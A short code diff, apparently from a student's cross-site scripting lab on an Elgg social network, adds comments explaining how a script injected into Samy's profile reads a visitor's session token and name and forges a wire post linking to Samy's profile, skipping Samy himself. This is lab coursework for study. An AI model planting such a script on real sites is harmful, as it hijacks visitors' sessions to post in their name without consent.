@@ -3,6 +3,17 @@
 	window.onload = function(){
 	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
 	//and Security Token __elgg_token
+
+    
+// For this Task, I logged in from Alice and posted some random things in the wire, thus I got a "Post" request.
+
+// I retrieved the url body and parameters and then edited the url.I edited the "body" in the url so that it conatins 
+// the link of the Samy's profile and the specified texts before it.
+
+// FInally to make sure Samy doesnot get affected by the code,I used a if condition to check if the 
+// person vsiting samy's profile was not Samy himself.
+
+
     var name=elgg.session.user.name;
     if(name!="Samy")
     {
